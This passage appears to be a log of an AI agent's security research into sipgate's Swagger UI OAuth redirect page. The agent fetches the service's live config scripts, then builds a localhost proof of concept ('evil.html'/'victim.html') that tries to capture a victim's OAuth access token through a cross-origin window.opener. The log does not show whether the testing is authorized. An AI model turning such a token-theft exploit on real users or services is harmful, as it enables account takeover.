line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetAliasRequest"}}],"produces":["application/json"],"responses":{"404":{"description":"Phoneline not found"}},"security":[{"oauth2":["all","phonelines:write"]}],"summary":"Update alias for an existing phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/blockanonymous":{"get":{"description":"","operationId":"getBlockAnonymousSetting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/PhonelineBlockAnonymousResponse"}}},"security":[{"oauth2":["all","phonelines:blockanonymous:read"]}],"summary":"Get the block anonymous setting of a specific phone line","tags":["phonelines"]},"put":{"description":"","operationId":"setBlockAnonymousSetting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetBlockAnonymousSettingsRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/PhonelineBlockAnonymousResponse"}}},"security":[{"oauth2":["all","phonelines:blockanonymous:write"]}],"summary":"Update the block anonymous setting for an existing phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/devices":{"get":{"description":"","operationId":"getDevicesForPhoneline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/DevicesResponse"}}},"security":[{"oauth2":["all","phonelines:read","phonelines:devices:read"]}],"summary":"List all devices of a specific phone line","tags":["phonelines"]},"post":{"description":"","operationId":"addDeviceToPhoneline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/RouteDeviceRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","phonelines:devices:write"]}],"summary":"Add device to phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/devices/{deviceId}":{"delete":{"description":"","operationId":"removeDeviceFromPhoneline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique device identifier","in":"path","name":"deviceId","required":true,"type":"string","x-example":"e0"}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","phonelines:devices:write"]}],"summary":"Remove device from phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/forwardings":{"get":{"operationId":"getPhonelineForwardings_1","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"OK","schema":{"$ref":"#/definitions/LegacyForwardingResponse"}}},"security":[{"oauth2":["all","phonelines:read","phonelines:forwardings:read"]}],"summary":"List all forwarding settings of a specific phone line","tags":["forwardings"]},"put":{"consumes":["application/json"],"operationId":"setPhonelineForwardingSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"in":"body","name":"body","required":true,"schema":{"$ref":"#/definitions/LegacyForwardingRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"OK","schema":{"$ref":"#/definitions/LegacyForwardingSetResponse"}},"400":{"description":"Forwarding settings could not be changed due to bad request"},"403":{"description":"Feature not booked"}},"security":[{"oauth2":["all","phonelines:write","phonelines:forwardings:write"]}],"summary":"Update forwarding settings for an existing phone line","tags":["forwardings"]}},"/{userId}/phonelines/{phonelineId}/numbers":{"get":{"description":"","operationId":"getPhonelineNumbers","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/EndpointNumbersResponse"}}},"security":[{"oauth2":["all","phonelines:read","phonelines:numbers:read"]}],"summary":"List all phone numbers routed to phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/parallelforwardings":{"get":{"deprecated":true,"description":"","operationId":"getPhonelineParallelForwardings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/ParallelForwardingsResponse"}},"403":{"description":"Feature not booked"}},"security":[{"oauth2":["all","phonelines:read","phonelines:parallelforwardings:read"]}],"summary":"List all parallel forwardings of a specific phone line","tags":["phonelines"]},"post":{"deprecated":true,"description":"","operationId":"addParallelForwarding","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetParallelForwardingRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","phonelines:write","phonelines:parallelforwardings:write"]}],"summary":"Create parallel forwarding for an existing phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/parallelforwardings/{parallelForwardingId}":{"delete":{"deprecated":true,"description":"","operationId":"deleteParallelForwardingSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique external device identifier","in":"path","name":"parallelForwardingId","required":true,"type":"string","x-example":"x0"}],"produces":["application/json"],"responses":{"404":{"description":"Parallel forwarding not found"}},"security":[{"oauth2":["all","phonelines:write","phonelines:parallelforwardings:write"]}],"summary":"Delete parallel forwarding","tags":["phonelines"]},"put":{"deprecated":true,"description":"","operationId":"changeParallelForwardingSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique external device identifier","in":"path","name":"parallelForwardingId","required":true,"type":"string","x-example":"x0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetParallelForwardingRequest"}}],"produces":["application/json"],"responses":{"404":{"description":"Parallel forwarding not found"}},"security":[{"oauth2":["all","phonelines:write","phonelines:parallelforwardings:write"]}],"summary":"Update an existing parallel forwarding","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/sipgateio":{"get":{"description":"","operationId":"getSipgateIoSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/PhonelineSipgateIoResponse"}},"403":{"description":"sipgate.io feature not booked"}},"security":[{"oauth2":["all","phonelines:read","phonelines:sipgateio:read"]}],"summary":"List sipgate.io settings of a specific phone line","tags":["phonelines"]},"put":{"description":"","operationId":"setSipgateIoSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetSipgateIoPhonelineSettingsRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"sipgate.io feature not booked"}},"security":[{"oauth2":["all","phonelines:write","phonelines:sipgateio:write"]}],"summary":"Update sipgate.io settings for an existing phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/sipgateio/log":{"get":{"description":"","operationId":"getSipgateIoLogs","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/PhonelineSipgateIoLogsResponse"}},"403":{"description":"sipgate.io feature not booked"}},"security":[{"oauth2":["all","phonelines:read","phonelines:sipgateio:log:read"]}],"summary":"List sipgate.io debug log for a specific phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/voicemails":{"get":{"deprecated":true,"description":"","operationId":"getVoicemails","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/PhonelineVoicemailsResponse"}},"403":{"description":"Voicemail feature not booked"}},"security":[{"oauth2":["all","phonelines:read","phonelines:voicemails:read"]}],"summary":"List all voicemails of a specific phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/voicemails/{voicemailId}":{"put":{"description":"","operationId":"changeVoicemailSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/ChangeVoicemailRequest"}}],"produces":["application/json"],"responses":{"400":{"description":"Voicemail settings could not be changed due to bad request"},"403":{"description":"Transcription not available"}},"security":[{"oauth2":["all","phonelines:write","phonelines:voicemails:write"]}],"summary":"Update voicemail settings for a specific phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/voicemails/{voicemailId}/greetings":{"get":{"description":"","operationId":"getPhonelineVoicemailGreetings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/GreetingsResponse"}}},"security":[{"oauth2":["all","phonelines:read","phonelines:voicemails:read","phonelines:voicemails:greetings:read"]}],"summary":"List all greetings for a specific phone line voicemail","tags":["phonelines"]},"post":{"description":"","operationId":"addGreeting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddGreetingRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/GreetingsResponse"}}},"security":[{"oauth2":["all","phonelines:write","phonelines:voicemails:write","phonelines:voicemails:greetings:write"]}],"summary":"Create a new greeting for a specific phone line voicemail","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/voicemails/{voicemailId}/greetings/{greetingId}":{"delete":{"description":"","operationId":"deletePhonlineVoicemailGreeting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"},{"description":"The unique greeting identifier","in":"path","name":"greetingId","required":true,"type":"string","x-example":"abc123"}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","phonelines:write","phonelines:voicemails:write","phonelines:voicemails:greetings:write"]}],"summary":"Delete an existing phone line voicemail greeting","tags":["phonelines"]},"put":{"description":"","operationId":"changePhonelineVoicemailGreeting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"},{"description":"The unique greeting identifier","in":"path","name":"greetingId","required":true,"type":"string","x-example":"abc123"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/ChangeVoicemailGreetingRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","phonelines:write","phonelines:voicemails:write","phonelines:voicemails:greetings:write"]}],"summary":"Update an existing phone line voicemail greeting","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}/voicemails/{voicemailId}/transcriptions":{"put":{"description":"","operationId":"changePhonelineVoicemailTranscriptionSetting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"},{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/ChangeVoicemailTranscriptionRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","phonelines:write","phonelines:voicemails:write"]}],"summary":"Update an existing phone line voicemail transcription setting","tags":["phonelines"]}},"/{userId}/sms":{"get":{"description":"","operationId":"getSmsExtensions","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/SmsExtensionsResponse"}}},"security":[{"oauth2":["all","sms:read"]}],"summary":"List all short message services","tags":["sms"]}},"/{userId}/sms/{smsId}":{"put":{"description":"","operationId":"setSmsAlias","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique short message service identifier","in":"path","name":"smsId","required":true,"type":"string","x-example":"s0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetAliasRequest"}}],"produces":["application/json"],"responses":{"404":{"description":"Short message service not found"}},"security":[{"oauth2":["all","sms:write"]}],"summary":"Update alias for an existing short message service","tags":["sms"]}},"/{userId}/sms/{smsId}/callerids":{"get":{"description":"","operationId":"getSmsCallerIds","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique short message service identifier","in":"path","name":"smsId","required":true,"type":"string","x-example":"s0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/SmsCallerIdsResponse"}}},"security":[{"oauth2":["all","sms:read","sms:callerid:read"]}],"summary":"List all caller IDs for a specific short message service","tags":["sms"]},"post":{"description":"","operationId":"addCallerId","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique short message service identifier","in":"path","name":"smsId","required":true,"type":"string","x-example":"s0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SmsCallerIdRequest"}}],"produces":["application/json"],"responses":{"402":{"description":"Insufficient funds"}},"security":[{"oauth2":["all","sms:write","sms:callerid:write"]}],"summary":"Create a new caller ID for an existing short message service","tags":["sms"]}},"/{userId}/sms/{smsId}/callerids/{callerId}":{"delete":{"description":"","operationId":"deleteSmsCallerId","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique short message service identifier","in":"path","name":"smsId","required":true,"type":"string","x-example":"s0"},{"description":"The caller ID","format":"int32","in":"path","name":"callerId","required":true,"type":"integer","x-example":123}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","sms:write","sms:callerid:write"]}],"summary":"Delete an existing caller ID for a specific short message service","tags":["sms"]},"put":{"description":"","operationId":"editCallerId","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique short message service identifier","in":"path","name":"smsId","required":true,"type":"string","x-example":"s0"},{"description":"The caller ID","format":"int32","in":"path","name":"callerId","required":true,"type":"integer","x-example":123},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetSmsCallerIdRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","sms:write","sms:callerid:write"]}],"summary":"Update the caller ID for an existing short message service","tags":["sms"]}},"/{userId}/sms/{smsId}/callerids/{callerId}/verification":{"post":{"description":"","operationId":"verifyCallerId","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique short message service identifier","in":"path","name":"smsId","required":true,"type":"string","x-example":"s0"},{"description":"The caller ID","format":"int32","in":"path","name":"callerId","required":true,"type":"integer","x-example":123},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/VerifySmsCallerIdRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","sms:write","sms:callerid:write"]}],"summary":"Verify an existing caller ID for a specific short message service","tags":["sms"]}}},"schemes":["https"],"securityDefinitions":{"oauth2":{"authorizationUrl":"https://login.sipgate.com/auth/realms/third-party/protocol/openid-connect/auth","flow":"implicit","scopes":{"account:read":"Access account details","account:write":"Manage account details","acds:read":"Access ACDs","acds:statistics:read":"Access ACD statistics","acds:statistics:write":"Manage ACD statistics","acds:write":"Manage ACDs","addresses:read":"Access addresses","addresses:write":"Manage addresses","appbookings:read":"Access bookings of sipgate App","appbookings:write":"Manage bookings of sipgate App","audiofiles:read":"Access audio files","audiofiles:write":"Manage audio files","authorization:oauth2:clients:read":"Access OAuth 2.0 clients","authorization:oauth2:clients:write":"Manage OAuth 2.0 clients","authorization:oauth:clients:read":"Access OAuth clients","authorization:oauth:clients:write":"Manage OAuth clients","autorecording:greeting:read":"Access autorecording greeting","autorecording:greeting:write":"Manage autorecording greeting","balance:read":"Access account balance","blacklist:read":"Access blacklist","blacklist:write":"Manage blacklist","callrestrictions:read":"Access call restrictions","callrestrictions:write":"Manage call restrictions","channel:logins:read":"Read channel logins","channel:logins:write":"Manage channel logins","channels:events:read":"Access channels events","channels:events:recordings:read":"Access channel event recordings","channels:events:recordings:write":"Manage channel event recordings","channels:events:write":"Manage channels events","channels:read":"Access channels","channels:write":"Manage channels","conferencerooms:read":"Access conferencerooms","conferencerooms:write":"Manage conferencerooms","contacts:read":"Access contacts","contacts:write":"Manage contacts","contracts:crm:read":"Access your CRM contracts","contracts:read":"Access contracts","contracts:write":"Manage contracts","cx:management:read":"Access CX user and channel settings","cx:management:write":"Manage CX users and channels","cx:statistics:read":"Access CX statistics","cx:statistics:write":"Manage CX statistics","devices:callerid:read":"Access caller ID","devices:callerid:write":"Manage caller ID","devices:contingents:read":"Access mobile device contingents","devices:contingents:write":"Book, cancel, and revoke cancellations for mobile device contingents","devices:forwardings:read":"Access forwardings of a device","devices:forwardings:write":"Manage forwardings of a device","devices:localprefix:read":"Access automatic local area code","devices:localprefix:write":"Manage automatic local area code","devices:read":"Access device settings","devices:sim:read":"Access SIM settings","devices:sim:write":"Manage SIM settings","devices:sims:orders:write":"Order SIM cards for device","devices:singlerowdisplay:read":"Access hide own number settings","devices:singlerowdisplay:write":"Manage hide own number settings","devices:tariffannouncement:read":"Access rate announcement settings","devices:tariffannouncement:write":"Manage rate announcement settings","devices:write":"Manage device settings","events:read":"Access call events","events:write":"Manage call events","faxlines:numbers:read":"Access fax device settings (numbers)","faxlines:read":"Access fax device settings","faxlines:write":"Manage fax device settings","frontdesk:read":"Access Frontdesk settings","frontdesk:statistics:read":"Access Frontdesk statistics","frontdesk:statistics:write":"Manage Frontdesk statistics","frontdesk:write":"Manage Frontdesk settings","greetings:read":"Access greetings","greetings:write":"Manage greetings","groups:devices:write":"Manage group device settings","groups:faxlines:read":"Access group fax device settings","groups:forwardings:read":"Access forwardings of a group","groups:forwardings:write":"Manage forwardings of a group","groups:numbers:read":"Access group numbers","groups:read":"Access groups","groups:users:read":"Access group members","groups:voicemails:read":"Access group voicemail settings","groups:write":"Manage groups","history:read":"Access call history","history:write":"Manage call history","ivrs:read":"Access IVRs","ivrs:write":"Manage IVRs","labels:read":"Access user labels","labels:write":"Manage user labels","log:webhooks:read":"Read your webhooks log data","microsoftteams:fqdn:read":"Read your microsoft teams fqdn data","microsoftteams:fqdn:write":"Manage your microsoft teams fqdn data","notifications:read":"Access notifications","notifications:write":"Manage notifications","numbers:read":"Access phone numbers","numbers:write":"Manage phone numbers","openid":"User information","payment:methods:read":"Access payment methods","payment:methods:write":"Manage payment methods","phonelines:blockanonymous:read":"Access anonymous call settings","phonel
+[0m
+The swagger.json confirms the live OAuth2 scheme — implicit flow against the third-party realm with a massive scope set. Let me pull the two remaining swagger doc pieces (`swagger-initializer.js` for the exact client_id, `keycloak-logout.js` referenced by the doc page) to close the loop on the swagger OAuth chain.
+[0m$ [0msleep 1; curl -sS --max-time 15 "https://api.sipgate.com/v2/doc/swagger-initializer.js" ; echo; echo "=== keycloak-logout.js ==="; sleep 1; curl -sS --max-time 15 "https://api.sipgate.com/v2/doc/keycloak-logout.js"
+window.onload = function() {
+  //<editor-fold desc="Changeable Configuration Block">
+
+  function getRandomInt(min, max) {
+		min = Math.ceil(min);
+		max = Math.floor(max);
+		return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+
+  var url = window.location.search.match(/url=([^&]+)/);
+  var baseUrl;
+  if (url && url.length > 1) {
+    url = decodeURIComponent(url[1]);
+  } else {
+    var port = /^(80|443)$/.test(window.location.port) || !window.location.port.length ? '' : ':'
+      + window.location.port;
+    baseUrl = "https://" + window.location.hostname + port;
+    url = baseUrl + "/v2/swagger.json";
+  }
+
+  // the following lines will be replaced by docker/configurator, when it runs in a docker-container
+  window.ui = SwaggerUIBundle({
+    oauth2RedirectUrl: baseUrl + "/v2/doc/oauth2-redirect.html",
+    url,
+    dom_id: '#swagger-ui',
+    deepLinking: true,
+    presets: [
+      SwaggerUIBundle.presets.apis,
+      SwaggerUIStandalonePreset
+    ],
+    plugins: [
+      SwaggerUIBundle.plugins.DownloadUrl, OAuthLogoutPlugin
+    ],
+    layout: "StandaloneLayout"
+  });
+
+  window.ui.initOAuth({
+    clientId: "sipgate-swagger-ui",
+    realm: "third-party",
+    appName: "sipgate-swagger-ui",
+    scopeSeparator: " ",
+    additionalQueryStringParams: {nonce: getRandomInt(1000000, 9999999)}
+  });
+
+  //</editor-fold>
+};
+
+=== keycloak-logout.js ===
+function OAuthLogoutPlugin() {
+	var lastAuthUrl = null;
+
+	return {
+		statePlugins: {
+			auth: {
+				wrapActions: {
+
+					authorizeOauth2: (originalAction, system) => (payload) => {
+						originalAction(payload);
+
+						var auth = payload.auth;
+
+						if (auth) {
+							lastAuthUrl = auth.schema.get('authorizationUrl');
+						}
+					},
+
+					logout: (originalAction, system) => (payload) => {
+						originalAction(payload);
+
+						if (lastAuthUrl) {
+							var redirectUrl = location.protocol + "//" + location.host + location.pathname + "/" + 'oauth2-logout.html';
+
+							var logoutUrl = lastAuthUrl.substring(0, lastAuthUrl.lastIndexOf('/')) + '/logout';
+							logoutUrl += "?redirect_uri=" + encodeURIComponent(redirectUrl);
+
+							window.open(logoutUrl);
+						}
+					}
+				}
+			}
+		}
+	}
+}
+[0m
+swagger-ui client confirmed live and high-value; the redirect page has no opener-origin check at all. The gating question is now pure browser semantics (does a cross-origin `window.opener.<prop>` read deliver or throw?). Let me check whether I can settle that empirically on localhost.
+[0m$ [0mwhich node npm npx chromium chromium-browser google-chrome chrome firefox 2>/dev/null; echo "---"; node --version 2>/dev/null; npm ls -g --depth=0 2>/dev/null | grep -iE "puppeteer|playwright"; ls /usr/lib/chromium* /opt/google 2>/dev/null; python3 --version 2>/dev/null
+/usr/local/bin/node
+/usr/local/bin/npm
+/usr/local/bin/npx
+/usr/bin/chromium
+/usr/bin/chromium-browser
+/usr/bin/google-chrome
+/usr/bin/firefox
+---
+v22.23.2
+/opt/google:
+chrome
+Python 3.12.3
+[0m
+Chromium is available — I can settle the cross-origin opener question empirically on localhost (no sipgate traffic involved). Building a controlled two-origin experiment that mirrors the exact live `oauth2-redirect.html` logic.
+[0m$ [0mmkdir -p /tmp/opencode/coc && cd /tmp/opencode/coc && cat > evil.html <<'EOF'
+<!doctype html><html><head><meta charset="utf-8"><title>evil</title></head><body>
+<script>
+window.__result = "NOT_SET";
+window.swaggerUIRedirectOauth2 = {
+  state: "attacker-chosen-state",
+  redirectUrl: "http://127.0.0.1:54321/victim.html",
+  auth: { name: "oauth2", schema: { get: function(k){ return null; } } },
+  callback: function(r){ window.__result = "DELIVERED:" + (r.token ? r.token.access_token : JSON.stringify(r)); },
+  errCb: function(e){ window.__result = "ERRCB:" + JSON.stringify(e); }
+};
+window.addEventListener("message", function(ev){
+  window.__result = ev.data;
+  document.body.setAttribute("data-result", ev.data);
+});
+window.open("http://127.0.0.1:54321/victim.html#access_token=LEAKED_VICTIM_TOKEN_123&state=attacker-chosen-state", "pp");
+setTimeout(function(){ document.body.setAttribute("data-final", window.__result); }, 500);
+</script>
+</body></html>
+EOF
+cat > victim.html <<'EOF'
+<!doctype html><html><head><meta charset="utf-8"><title>victim</title></head><body>
+<script>
+'use strict';
+var outcome = null;
+try {
+  var oauth2 = window.opener.swaggerUIRedirectOauth2;
+  var sentState = oauth2.state;
+  var redirectUrl = oauth2.redirectUrl;
+  var isValid, qp, arr;
+  if (/code|token|error/.test(window.location.hash)) { qp = window.location.hash.substring(1); }
+  else { qp = location.search.substring(1); }
+  arr = qp.split("&");
+  arr.forEach(function (v,i,_arr) { _arr[i] = '"' + v.replace('=', '":"') + '"';});
+  qp = qp ? JSON.parse('{' + arr.join() + '}', function (key, value) { return key === "" ? value : decodeURIComponent(value); }) : {};
+  isValid = qp.state === sentState;
+  oauth2.callback({auth: oauth2.auth, token: qp, isValid: isValid, redirectUrl: redirectUrl});
+  outcome = "DELIVERED";
+} catch (e) {
+  outcome = "BLOCKED:" + e.name;
+}
+if (window.opener) { try { window.opener.postMessage(outcome, "*"); } catch (e) { document.body.setAttribute("data-ignore","post-msg-failed:"+e.name); } }
+window.close();
+</script>
+</body></html>
+EOF
+echo "written"; ls -la
+written
+total 16
+drwxr-xr-x 2 runner runner 4096 Sep  6 04:02 .
+drwxr-xr-x 3 runner runner 4096 Sep  6 04:02 ..
+-rw-r--r-- 1 runner runner  880 Sep  6 04:02 evil.html
+-rw-r--r-- 1 runner runner 1069 Sep  6 04:02 victim.html
+[0m
+[0m$ [0mcd /tmp/opencode/coc && python3 -m http.server 12345 --bind 127.0.0.1 >/tmp/opencode/coc/s1.log 2>&1 &
+python3 -m http.server 54321 --bind 127.0.0.1 >/tmp/opencode/coc/s2.log 2>&1 &
+sleep 1
+echo "servers up"
+chromium --headless=new --no-sandbox --disable-gpu --user-data-dir=/tmp/opencode/coc/chrome-prof --virtual-time-budget=5000 --dump-dom "http://127.0.0.1:12345/evil.html" 2>/dev/null | grep -E "data-result|data-final|DELIVERED|BLOCKED|NOT_SET" | head -10
+echo "=== exit: $? ==="
+servers up
+
+
+<shell_metadata>
+shell tool terminated command after exceeding timeout 120000 ms. If this command is expected to take longer and is not waiting for interactive input, retry with a larger timeout value in milliseconds.
+</shell_metadata>
+[0m
+[0m$ [0mpkill -f "http.server 12345" 2>/dev/null; pkill -f "http.server 54321" 2>/dev/null; pkill -f "chromium --headless" 2>/dev/null; pkill -9 -f "chrome-prof" 2>/dev/null; sleep 1; echo "cleaned"
+cat > /tmp/opencode/coc/driver.mjs <<'EOF'
+import { spawn } from 'node:child_process';
+
+const chrome = spawn('/usr/bin/chromium', [
+  '--headless=new','--no-sandbox','--disable-gpu','--disable-dev-shm-usage',
+  '--remote-debugging-port=9222','--user-data-dir=/tmp/opencode/coc/cdp-prof','about:blank'
+], { stdio: 'ignore' });
+
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+async function getJson(url, tries = 30) {
+  for (let i = 0; i < tries; i++) {
+    try { const r = await fetch(url); if (r.ok) return await r.json(); } catch {}
+    await sleep(500);
+  }
+  throw new Error('CDP not up');
+}
+
+class Ctx {
+  constructor(ws){ this.ws = ws; this.id = 0; this.pending = new Map(); this.events = [];
+    ws.onmessage = (m) => { const d = JSON.parse(m.data); if (d.id) { const p = this.pending.get(d.id); if (p) { this.pending.delete(d.id); d.error ? p.reject(new Error(JSON.stringify(d.error))) : p.resolve(d.result); } } }; }
+  send(method, params = {}) { const id = ++this.id; this.ws.send(JSON.stringify({id, method, params})); return new Promise((resolve,reject) => this.pending.set(id, {resolve,reject})); }
+  async eval(expr) { const r = await this.send('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true }); if (r.exceptionDetails) return 'EXCEPTION: ' + JSON.stringify(r.exceptionDetails.exception?.description || r.exceptionDetails.text); return JSON.stringify(r.result?.result?.value); }
+}
+
